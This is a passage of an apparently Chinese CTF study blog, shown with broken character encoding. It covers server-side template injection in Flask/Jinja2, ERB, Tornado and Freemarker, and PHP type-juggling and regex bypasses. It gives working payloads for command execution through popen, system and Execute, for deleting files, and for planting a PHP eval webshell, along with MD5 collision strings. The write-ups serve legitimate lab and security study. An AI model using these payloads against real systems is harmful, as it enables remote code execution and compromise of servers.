/flag).read()ï¼š % set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right % ç„¶åå°†ä¸Šé¢æ„é€ çš„å„ç§å˜é‡æ·»åŠ åˆ°SSTIä¸‡èƒ½payloadé‡Œé¢å°±è¡Œäº†ï¼š % for f,v in whoami.__init__.__globals__.items() % # globals % if f == bul % % for a,b in v.items() % # builtins % if a == ev % # eval b(pld) # eval(__import__(os).popen(cat /flag).read()) % endif % % endfor % % endif %% endfor % æ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š % set zero = (( |select|string|list).pop(38)|int) %% set one = (zero**zero)|int %% set two = (zero-one-one)|abs|int %% set four = (two*two)|int %% set five = (two*two*two)-one-one-one %% set seven = (zero-one-one-five)|abs %% set xhx = (( |select|string|list).pop(24)|string) %% set space = (( |select|string|list).pop(10)|string) %% set point = ((app.__doc__|string|list).pop(26)|string) %% set yin = ((app.__doc__|string|list).pop(195)|string) %% set left = ((app.__doc__|string|list).pop(189)|string) %% set right = ((app.__doc__|string|list).pop(200)|string) %% set c = dict(c=aa)|reverse|first %% set bfh=self|string|urlencode|first %% set bfhc=bfh~c %% set slas = bfhc%((four~seven)|int) %% set but = dict(buil=aa,tins=dd)|join %% set imp = dict(imp=aa,ort=dd)|join %% set pon = dict(po=aa,pen=dd)|join %% set os = dict(o=aa,s=dd)|join %% set ca = dict(ca=aa,t=dd)|join %% set flg = dict(fl=aa,ag=dd)|join %% set ev = dict(ev=aa,al=dd)|join %% set red = dict(re=aa,ad=dd)|join %% set bul = xhx*2~but~xhx*2 %% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %% for f,v in whoami.__init__.__globals__.items() %% if f == bul %% for a,b in v.items() %% if a == ev %b(pld)% endif %% endfor %% endif %% endfor % æ‹¿å»æ‰§è¡Œï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤å¹¶å¾—åˆ°äº†flag è¿‡æ»¤äº†requestå’Œclassè¿™é‡Œé™¤äº†ç”¨ä¸Šé¢ä¸­æ‹¬å·æˆ– |attr() é‚£å‡ ç§æ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨flaské‡Œé¢çš„sessionå¯¹è±¡å’Œconfigå¯¹è±¡æ¥é€ƒé€¸è¿™ä¸€å§¿åŠ¿ã€‚ ä¸‹é¢é€šè¿‡NCTF2018çš„ä¸¤é“flaské¢˜ç›®æ¥ä»”ç»†è®²è§£ã€‚ [NCTF2018]flaskçœŸé¦™æ‰“å¼€é¢˜ç›®ä¸€çœ‹ï¼Œæ˜¯ä¸€ä¸ªç‚«é…·çš„demoæ¼”ç¤ºï¼Œè¿™ç§demoä¸€èˆ¬æ˜¯æ²¡æœ‰å•¥ä¸œè¥¿å¥½æŒ–çš„ã€‚é¦–å…ˆF12ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°Pythonç‰ˆæœ¬æ˜¯3.5.2ï¼Œæ²¡æœ‰Webé™æ€æœåŠ¡å™¨ã€‚ éšä¾¿ç‚¹å¼€ç¬¬äºŒä¸ªdemoå‘ç°404äº†ï¼Œè¿™é‡Œæ³¨æ„åˆ°404ç•Œé¢æ˜¯Flaskæä¾›çš„404ç•Œé¢ï¼ŒæŒ‰ç…§ä»¥å¾€çš„ç»éªŒï¼ŒçŒœæµ‹è¿™é‡Œå­˜åœ¨SSTIæ³¨å…¥ã€‚ å…ˆå°è¯•ç®€å•çš„payloadï¼š ä»è¿™é‡Œå¯è§ï¼Œæ¯«æ— ç–‘é—®çš„å­˜åœ¨SSTIæ¼æ´äº†ã€‚ é‚£ä¹ˆå°±æ¥åº·åº·åˆ°åº•æœ‰æ²¡æœ‰WAFï¼Œæœ‰çš„è¯è¢«è¿‡æ»¤äº†å“ªäº›ã€‚ç»è¿‡ä¸€ç•ªæµ‹è¯•ï¼Œç¡®å®å¾ˆå¤šä¸œè¥¿éƒ½è¢«è¿‡æ»¤äº†ï¼Œè€Œä¸”æ˜¯æ­£åˆ™è¡¨è¾¾å¼ç›´æ¥åŒ¹é…åˆ å»ï¼Œæ— æ³•åµŒå¥—ç»•è¿‡ã€‚ä¸å®Œæ•´æµ‹è¯•æœ‰ä»¥ä¸‹ï¼š configclassmroargsrequestopenevalbuiltinsimport ä»è¿™é‡Œæ¥çœ‹ï¼Œä¼¼ä¹å·²ç»å®Œå…¨æ— æ³•ä¸‹æ‰‹äº†ã€‚å› ä¸ºrequestå’Œclasséƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚ å¡åœ¨è¿™é‡Œä»¥åï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯å»æŸ¥Flaskå®˜æ–¹æ–‡æ¡£äº†ã€‚ä»Flaskå®˜æ–¹æ–‡æ¡£é‡Œï¼Œæ‰¾åˆ°äº†sessionå¯¹è±¡ï¼Œç»è¿‡æµ‹è¯•æ²¡æœ‰è¢«è¿‡æ»¤ã€‚æ›´å·§çš„æ˜¯ï¼Œsessionä¸€å®šæ˜¯ä¸€ä¸ªdictå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡é”®çš„æ–¹æ³•è®¿é—®ç›¸åº”çš„ç±»ã€‚ç”±äºé”®æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚ pythonï¼š session[__cla+ss__] è®¿é—®åˆ°äº†ç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ __bases__ æ¥è·å–åŸºç±»çš„å…ƒç»„ï¼Œå¸¦ä¸Šç´¢å¼•0å°±å¯ä»¥è®¿é—®åˆ°ç›¸åº”çš„åŸºç±»ã€‚ç”±æ­¤ä¸€ç›´å‘ä¸Šæˆ‘ä»¬å°±å¯ä»¥è®¿é—®åˆ°æœ€é¡¶å±‚çš„objectåŸºç±»äº†ã€‚ï¼ˆåŒæ ·çš„ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤configçš„è¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨configæ¥é€ƒé€¸ï¼Œæ–¹æ³•ä¸sessionçš„ç›¸åŒï¼‰ payloadï¼š session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0] æœ‰äº†å¯¹è±¡åŸºç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—® __subclasses__ æ–¹æ³•å†å®ä¾‹åŒ–å»è®¿é—®æ‰€æœ‰çš„å­ç±»ã€‚åŒæ ·ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡WAFï¼Œè¿™æ ·å°±å®ç°æ²™ç®±é€ƒé€¸äº†ã€‚ payloadï¼š session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0][__subcla+ss__]() SSTIç›®çš„æ— éå°±æ˜¯ä¸¤ä¸ªï¼šæ–‡ä»¶è¯»å†™ã€æ‰§è¡Œå‘½ä»¤ã€‚å› æ­¤æˆ‘ä»¬æ ¸å¿ƒåº”è¯¥æ”¾åœ¨fileç±»å’Œosç±»ã€‚è€Œå‘çˆ¹çš„æ˜¯ï¼ŒPython3å‡ ä¹æ¢äº†ä¸ªéã€‚å› æ­¤è¿™é‡Œå¾—å»çœ‹å®˜æ–¹æ–‡æ¡£å»æ‰¾ç›¸åº”çš„åŸºç±»çš„ç”¨å¤„ã€‚ æˆ‘è¿˜æ˜¯ä»osåº“å…¥æ‰‹ï¼Œç›´æ¥æœç´¢â€œosâ€ï¼Œæ‰¾åˆ°äº† os._wrap_close ç±»ï¼ŒåŒæ ·ä½¿ç”¨dicté”®è®¿é—®çš„æ–¹æ³•ã€‚çŒœå¤§è‡´èŒƒå›´å¾—åˆ°äº†ç´¢å¼•åºå·ï¼Œæˆ‘è¿™é‡Œåºå·æ˜¯312ï¼Œ payloadï¼š session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0][__subcla+sses__]()[312] æˆ‘ä»¬è°ƒç”¨å®ƒçš„ __init__ å‡½æ•°å°†å…¶å®ä¾‹åŒ–ï¼Œç„¶åç”¨ __globals__ æŸ¥çœ‹å…¶å…¨å±€å˜é‡ã€‚ payloadï¼š session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0][__subcla+sses__]()[312].__init__.__globals__ çœ¼åˆèŠ±äº†ï¼Œä½†æˆ‘ä»¬çš„ç›®çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯è¦æ‰§è¡Œå‘½ä»¤ï¼Œäºæ˜¯ç›´æ¥æœç´¢ â€œpopenâ€ å°±å¯ä»¥äº†ï¼š ç”±äºåˆæ˜¯ä¸€ä¸ªdictç±»å‹ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™åˆå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡openè¿‡æ»¤ã€‚ åé¢é¡ºç†æˆç« çš„ï¼Œæˆ‘ä»¬å°†å‘½ä»¤å­—ç¬¦ä¸²ä¼ å…¥ï¼Œå®ä¾‹åŒ–è¿™ä¸ªå‡½æ•°ï¼Œç„¶åç›´æ¥è°ƒç”¨readæ–¹æ³•å°±å¯ä»¥äº†ã€‚ payloadï¼š session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0][__subcla+sses__]()[312].__init__.__globals__[po+pen](ls /).read() session[__cla+ss__].__bases__[0].__bases__[0].__bases__[0].__bases__[0][__subcla+sses__]()[312].__init__.__globals__[po+pen](cat /Th1s__is_S3cret).read() BP-Lab: Basic server-side template injection(ERBæ¨¡æ¿)é¢˜ç›®è¦æ±‚ï¼šè¦è§£å†³å®éªŒé—®é¢˜ï¼Œè¯·æŸ¥çœ‹ ERB æ–‡æ¡£ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä» Carlos çš„ä¸»ç›®å½•ä¸­åˆ é™¤è¯¥ morale.txt æ–‡ä»¶ é¦–å…ˆåœ¨hacktricksä¸Šé¢æœç´¢ERBï¼Œç»“æœä¸ºï¼šhttps://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby è¯¥è¯­æ³• %= someExpression % ç”¨äºè®¡ç®—è¡¨è¾¾å¼å¹¶åœ¨é¡µé¢ä¸Šå‘ˆç°ç»“æœï¼Œå‡ ç§åŸºæœ¬æ“ä½œå¦‚ä¸‹ï¼š å½“ç‚¹å‡»ç¬¬ä¸€ä¸ªå•†å“çš„æ—¶å€™ï¼Œé¡µé¢æç¤ºå¦‚ä¸‹ï¼š çŒœæµ‹å­˜åœ¨ERBæ¼æ´ï¼Œäºæ˜¯å¼€å§‹å°è¯•ï¼Œé¦–å…ˆè¾“å…¥ %= system(whoami) %ï¼Œå‘ç°æ­£åœ¨é¢˜ç›®è¦æ±‚çš„Carolsç›®å½•ä¸‹é¢ï¼Œäºæ˜¯æˆ‘ä»¬æ‰§è¡Œç¬¬äºŒä¸ªä»£ç ç›´æ¥åˆ é™¤æ‰€éœ€åˆ é™¤çš„æ–‡ä»¶ï¼š%= system(rm ./morale.txt) %ï¼Œè§£å†³é¢˜ç›® BP-Lab: Basic server-side template injection(code context)(Tornadoæ¨¡æ¿)é¢˜ç›®è¦æ±‚ï¼šè¯·æŸ¥çœ‹ Tornado æ–‡æ¡£ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä» Carlos çš„ä¸»ç›®å½•ä¸­åˆ é™¤è¯¥ morale.txt æ–‡ä»¶ Tornadoæ¨¡æ¿ï¼šhttps://ajinabraham.com/blog/server-side-template-injection-in-tornado å…ˆè¿›å…¥ä¸€ç¯‡æ–‡ç« å‘è¡¨äº†ä¸€æ¡è¯„è®ºï¼Œç„¶åç™»å½•æˆ‘çš„è´¦æˆ·ï¼Œæ›´æ”¹ç½‘ç«™å¸Œæœ›ä½¿ç”¨æ‚¨çš„å…¨åã€åå­—æˆ–æ˜µç§°ï¼Œæ›´æ”¹å®Œååˆ·æ–°è¯„è®ºåŒºå‘ç°åå­—ä¼šéšç€æˆ‘çš„æ›´æ”¹è€Œæ”¹å˜ï¼Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼ŒæŠ“åŒ…å°è¯•ä¸€ä¸‹ï¼š å‘ç°è¯„è®ºåŒºåå­—åé¢ä¼šè·Ÿç€47ï¼Œç¡®è®¤å­˜åœ¨æ¼æ´ï¼Œæ¥ç€æ“ä½œ ä½äºCarlosç›®å½•ä¸‹ï¼Œç»§ç»­æ“ä½œåˆ é™¤è¦æ±‚çš„æ–‡ä»¶ï¼š BP-Lab: Basic server-side template injection using documentation(Freemarkeræ¨¡æ¿)é¢˜ç›®è¦æ±‚ï¼šè¯·ç¡®å®šæ¨¡æ¿å¼•æ“å¹¶ä½¿ç”¨æ–‡æ¡£æ¥äº†è§£å¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä» Carlos çš„ä¸»ç›®å½•ä¸­åˆ é™¤è¯¥ morale.txt æ–‡ä»¶ æˆ‘ä»¬å…ˆç™»å½•é¢˜ç›®æä¾›çš„è´¦å·ï¼Œç„¶åè¿›å…¥éšä¾¿ä¸€ä¸ªå•†å“æ»‘åˆ°æœ€ä¸‹é¢ç‚¹å‡»ä¿®æ”¹æ¨¡æ¿ï¼ˆè‹±è¯­ç‰ˆçš„ï¼‰ï¼Œè¿›å…¥ä¸€ä¸ªé¡µé¢å¼€å§‹ä¿®æ”¹ï¼Œæ”¹æ¨¡æ¿çš„è¯­æ³•æ˜¯ $è¯­å¥ï¼Œå¦‚æœæˆ‘ä»¬çš„è¯­å¥å¡«å…¥çš„æ˜¯ä¸å­˜åœ¨çš„å¯¹è±¡ï¼Œä¿å­˜åé¡µé¢ä¼šæŠ¥é”™ï¼Œä»æŠ¥é”™ä¿¡æ¯ä¸­å¾—åˆ°æ”¹æ¨¡æ¿ä¸ºFreemarkerï¼Œäºæ˜¯ä¸Šhacktricksæœç´¢ç›¸å…³æ¼æ´ï¼ˆå½“ç„¶é¢˜ç›®è¦æ±‚çš„æ˜¯è‡ªå·±æŸ¥é˜…æ–‡æ¡£è§£å†³ï¼Œä¸æ˜¯è¿™æ ·å­çš„ï¼‰ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š å…¶ä¸­ï¼Œnew() å¯ç”¨äºåˆ›å»ºå®ç°æ¥å£çš„ TemplateModel ä»»æ„ Java å¯¹è±¡ï¼Œæœ‰ä¸€ä¸ªåä¸º Execute çš„ç±»ï¼Œå¯ç”¨äºæ‰§è¡Œä»»æ„ shell å‘½ä»¤ï¼Œå¼€å§‹æ„é€ ï¼š#assign ex = freemarker.template.utility.Execute?new()$ ex(id)ï¼Œç¡®å®šæ‰€å¤„ç›®å½•æ˜¯Carlosï¼Œäºæ˜¯åˆ é™¤è¦æ±‚çš„æ–‡ä»¶ï¼š#assign ex = freemarker.template.utility.Execute?new()$ ex(rm ./morale.txt)ï¼Œé¢˜ç›®è§£å†³ Lab: Server-side template injection in an unknown language with a documented exploité¢˜ç›®è¦æ±‚ï¼šè¯·ç¡®å®šæ¨¡æ¿å¼•æ“å¹¶åœ¨çº¿æŸ¥æ‰¾å¯ç”¨äºæ‰§è¡Œä»»æ„ä»£ç çš„æ–‡æ¡£æ¼æ´ï¼Œç„¶åä» Carlos çš„ä¸»ç›®å½•ä¸­åˆ é™¤è¯¥ morale.txt æ–‡ä»¶ è¿›å…¥å®éªŒå®¤åæˆ‘ä»¬å…ˆç‚¹å‡»ç¬¬ä¸€ä¸ªå•†å“ï¼Œå›æ˜¾è·Ÿç¬¬ä¸€é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬éœ€è¦ç¡®å®šä½¿ç”¨çš„æ˜¯å“ªç§æ¨¡æ¿ï¼Œäºæ˜¯è¾“å…¥ $","tags":["ssti","python"],"categories":["CTF"]},{"title":"phpç‰¹æ€§","path":"/2024/02/27/phpç‰¹æ€§/","content":"çŸ¥è¯†1ã€æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼if(preg_match(/[0-9]/, $num)) die(no no no!); else(intval($num)) echo $flag; preg_matchç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™ä¸ä¼šè¿›å…¥ifè¯­å¥ payload:num[]=1 2ã€intvalå‡½æ•°çš„ä½¿ç”¨intval( mixed $value, int $base = 10) : int å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ value çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼šâ—¦ å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œâ—¦ å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œâ—¦ å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal) if($num===4476) die(no no no!); if(intval($num,0)===4476) echo $flag; else echo intval($num,0); ç§‘å­¦è®¡æ•°æ³•ä¹Ÿå¯ä»¥ç»•è¿‡ intval(4476.0)===4476 å°æ•°ç‚¹ intval(+4476.0)===4476 æ­£è´Ÿå·intval(4476e0)===4476 ç§‘å­¦è®¡æ•°æ³•intval(0x117c)===4476 16è¿›åˆ¶intval(010574)===4476 8è¿›åˆ¶intval( 010574)===4476 8è¿›åˆ¶+ç©ºæ ¼ payload:num=4476.0 3ã€æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦web91if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; ^åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œi ä¸åŒºåˆ†(ignore)å¤§å°å†™ï¼›$åŒ¹é…å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œmå¤š(more)è¡ŒåŒ¹é…ï¼Œè‹¥æœ‰æ¢è¡Œç¬¦åˆ™ä»¥æ¢è¡Œç¬¦åˆ†å‰²ï¼ŒæŒ‰è¡ŒåŒ¹é… payload:%0aphp,ç¬¬ä¸€è¡ŒåŒ¹é…æ¢è¡Œåæœ‰phpæ•…é€šè¿‡ï¼Œç¬¬äºŒä¸ªä¸ç¬¦åˆphpå¼€å¤´phpç»“å°¾æ•…ä¸é€šè¿‡ 4ã€highlight_fileè·¯å¾„web96highlight_fileçš„å‚æ•°å¯ä»¥æ˜¯è·¯å¾„çš„ if($_GET[u]==flag.php) die(no no no); else highlight_file($_GET[u]); ifè¯­å¥åªæ¯”å¯¹å­—ç¬¦ä¸²ï¼Œhighlight_fileå¯ä»¥å†™è·¯å¾„ï¼Œæ•…payloadæœ‰å¤šç§è§£æ³•ï¼š /var/www/html/flag.php ç»å¯¹è·¯å¾„./flag.php ç›¸å¯¹è·¯å¾„php://filter/resource=flag.php phpä¼ªåè®® 5ã€md5æ¯”è¾ƒç¼ºé™·PHPä¸­hashæ¯”è¾ƒæ˜¯å­˜åœ¨ç¼ºé™·çš„ï¼ŒMD5æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™è¿”å›NULLï¼Œä¸¤ä¸ªNULLæ˜¯å¼ºç›¸ç­‰çš„ if ($_POST[a] != $_POST[b]) if (md5($_POST[a]) === md5($_POST[b])) echo $flag; else print Wrong.; ä¸åŒæ•°æ®å¼ºç›¸ç­‰ payload:a[]=1b[]=2 md5å¼±æ¯”è¾ƒï¼Œä½¿ç”¨äº†å¼ºåˆ¶ç±»å‹è½¬æ¢åä¸å†æ¥æ”¶æ•°ç»„ $a=(string)$a;$b=(string)$b;if( ($a!==$b) (md5($a)==md5($b)) )echo $flag; md5å¼±æ¯”è¾ƒï¼Œä¸º0eå¼€å¤´çš„ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®°æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥åªéœ€æ‰¾ä¸¤ä¸ªmd5åéƒ½ä¸º0eå¼€å¤´ä¸”0eåé¢å‡ä¸ºæ•°å­—çš„å€¼å³å¯ã€‚ ä¸åŒæ•°æ®å¼±ç›¸ç­‰ payload: a=QNKCDZOb=240610708 MD5ç­‰äºè‡ªèº«ï¼Œå¦‚md5($a)==$a,phpå¼±æ¯”è¾ƒä¼šæŠŠ0eå¼€å¤´è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ‰¾åˆ°ä¸€ä¸ªMD5åŠ å¯†å‰åéƒ½æ˜¯0eå¼€å¤´çš„ï¼Œå¦‚0e215962017 md5å¼ºç¢°æ’ $a=(string)$a;$b=(string)$b;if( ($a!==$b) (md5($a)===md5($b)) )echo $flag;è¿™æ—¶å€™éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªçœŸæ­£çš„md5å€¼ç›¸åŒæ•°æ®a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 6ã€ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£+å˜é‡è¦†ç›–web98?php include(flag.php);$_GET?$_GET=$_POST:flag;$_GET[flag]==flag?$_GET=$_COOKIE:flag;$_GET[flag]==flag?$_GET=$_SERVER:flag;highlight_file($_GET[HTTP_FLAG]==flag?$flag:__FILE__);? ç¬¬ä¸€è¡Œï¼ŒGETè¢«è®¾ç½®ï¼Œå°±å¯ä»¥ç”¨POSTè¦†ç›–GETçš„å€¼ã€‚ä¸­é—´ä¸¤è¡Œæ„ä¹‰ä¸å¤§ï¼Œæ˜¯flagå°±è¢«COOKIEè¦†ç›–ï¼Œç„¶åè¢«SERVERè¦†ç›–ï¼Œä¸æ˜¯flagè¢«èµ‹å€¼flagç„¶åæ¡ä»¶æˆç«‹ä¹Ÿæ˜¯è¢«SERVERè¦†ç›–ã€‚è€Œä¸”è¿™ä¸ªè¢«è¦†ç›–çš„GETæ²¡æœ‰æŒ‡å®šï¼Œä»»æ„éƒ½è¡Œï¼Œç¬¬å››è¡Œæ‰æ˜¯å…³é”®ï¼Œç­‰äºflagå°±è¾“å‡ºflagï¼Œä¸ç­‰äºæ˜¾ç¤ºæºç ã€‚æ‰€ä»¥åªéœ€è¦ä¼ å…¥ä¸€ä¸ªä»»æ„çš„GETä¿è¯$_GETæ˜¯è¢«è®¾ç½®çš„ã€‚ç„¶åPOSTä¸€ä¸ªè¦†ç›–å®ƒ ç¬¬ä¸€è¡Œï¼Œä½¿ç”¨GETæ–¹å¼æ¥æ”¶æ•°æ®ï¼Œè‹¥æ˜¯GETä¼ å‚ï¼Œåˆ™å°†GETæ›¿æ¢æˆPOST å…ˆç”¨GET å¾€é‡Œä¼ ä¸œè¥¿ï¼Œéšä¾¿ä¼  ä¾‹å¦‚ï¼š url?1 ç„¶åæ ¹æ®æœ€åä¸€è¡Œ hackbaré€šè¿‡POSTæ–¹å¼å¾€é‡Œä¼ HTTP_FLAGflagå³å¯ payload:getï¼š1=1 postï¼šHTTP_FLAG=flag 7ã€phpå¼±ç±»å‹æ¯”è¾ƒweb99ç»å…¸ $allow = array();for ($i=36; $i 0x36d; $i++) array_push($allow, rand(1,$i));if(isset($_GET[n]) in_array($_GET[n], $allow)) file_put_contents($_GET[n], $_POST[content]); å¯¹äºä»£ç çš„è§£é‡Šï¼š $allow = array();: åˆ›å»ºäº†ä¸€ä¸ªåä¸º $allow çš„ç©ºæ•°ç»„ï¼Œç”¨äºå­˜å‚¨å…è®¸æ“ä½œçš„æ–‡ä»¶åã€‚ for ($i=36; $i 0x36d; $i++) array_push($allow, rand(1,$i)); : è¿™æ˜¯ä¸€ä¸ª for å¾ªç¯ï¼Œä»åè¿›åˆ¶æ•° 36 åˆ°åå…­è¿›åˆ¶æ•° 0x36dï¼ˆåè¿›åˆ¶æ•°ä¸º 877ï¼‰å¾ªç¯éå†ï¼Œæ¯æ¬¡å¾ªç¯å°†ä¸€ä¸ªéšæœºæ•°ï¼ˆèŒƒå›´åœ¨ 1 åˆ°å½“å‰å¾ªç¯å˜é‡ $i çš„å€¼ä¹‹é—´ï¼‰æ·»åŠ åˆ° $allow æ•°ç»„ä¸­ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å…è®¸æ“ä½œçš„æ–‡ä»¶åæ•°ç»„ã€‚ if(isset($_GET[n]) in_array($_GET[n], $allow)): è¿™è¡Œä»£ç é¦–å…ˆæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† GET è¯·æ±‚å‚æ•° nï¼Œå¹¶ä¸”æ£€æŸ¥å‚æ•°å€¼æ˜¯å¦å­˜åœ¨äº $allow æ•°ç»„ä¸­ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚ file_put_contents($_GET[n], $_POST[content]);: è¿™è¡Œä»£ç ä½¿ç”¨ file_put_contents() å‡½æ•°å°† POST è¯·æ±‚å‚æ•° content çš„å†…å®¹å†™å…¥åˆ°åä¸º n çš„æ–‡ä»¶ä¸­ã€‚è¿™é‡Œçš„ $_GET[n] æ˜¯æ–‡ä»¶åï¼Œ$_POST[content] æ˜¯è¦å†™å…¥çš„æ–‡ä»¶å†…å®¹ã€‚ å¼±æ¯”è¾ƒå­—ç¬¦ä¸²1.phpä¸1è¿”å›trueã€‚array_pushè¿™ä¸ªå‡½æ•°å¾€é‡Œå¡«æ•°å­—1ï¼Œåˆ™æ˜¯intç±»å‹ï¼Œin_arrayä½¿ç”¨çš„å°±æ˜¯å¼±æ¯”è¾ƒã€‚æ‰€ä»¥ï¼Œå¦‚æœæ•°ç»„é‡Œæœ‰æ•°å­—1ï¼Œä¸å­—ç¬¦ä¸²1.phpæ¯”è¾ƒæ—¶æ˜¯è¿”å›trueçš„ã€‚æ³¨æ„ï¼Œ$array( 1 , â€˜2â€™ , â€˜3â€™ )ï¼Œè¿™é‡Œ1æ˜¯intå‹ï¼Œ2å’Œ3éƒ½æ˜¯stringç±»å‹ã€‚ è¿™é“é¢˜ï¼Œæ¯æ¬¡ç”Ÿæˆéšæœºæ•°éƒ½åŒ…å«1ï¼Œæ‰€ä»¥1åœ¨æ•°ç»„ä¸­çš„å¯èƒ½æœ€å¤§ã€‚ payload:n=1.php post:content=?php eval($_POST[1]);?åªè¦ï¼Œç„¶åèšå‰‘ç›´æ¥è¿ 8ã€andä¸çš„åŒºåˆ«?php$a=true and false and false;var_dump($a); è¿”å›true$a=true false false;var_dump($a); è¿”å›false andè¿ç®—ç¬¦ä¼˜å…ˆçº§ä½äº =ï¼Œè¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äº = 9ã€åå°„ç±»ReflectionClassweb101åå°„ç±»è¿˜ä¸å¤ªæ‡‚ï¼Œä½†åšé¢˜éƒ½æ˜¯ç›´æ¥è¾“å‡ºè¿™ä¸ªç±»echo new ReflectionClass(ç±»å);ï¼Œå¯ä»¥è·å¾—ç±»çš„åå°„å¯¹è±¡ï¼ˆåŒ…å«å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚ å…ƒæ•°æ®å¯¹è±¡ï¼ˆåŒ…å«classçš„æ‰€æœ‰å±æ€§æ–¹æ³•çš„å…ƒæ•°æ®ä¿¡æ¯ï¼‰ ?phphighlight_file(__FILE__);include(ctfshow.php);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[v1];$v2=$_GET[v2];$v3=$_GET[v3];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0) if(!preg_match(/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\|\\[|\\|\\|\\,|\\.|\\;|\\?|[0-9]/, $v2)) if(!preg_match(/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\|\\[|\\|\\|\\,|\\.|\\?|[0-9]/, $v3)) eval($v2(ctfshow)$v3); ? payloadï¼š?v1=1v2=echo new Reflectionclassv3=; flagä¸­æœ‰äº›å­—ç¬¦ç»è¿‡ACSIIç å˜æ¢ï¼Œå¥½åƒè¿˜å°‘äº†ä¸€ä½ï¼Œçˆ†ç ´å³å¯ï¼ˆè¿™æ­¥ç›®å‰è¿˜ä¸ä¼šæ“ä½œï¼‰ 10ã€is_numericä¸hex2bin 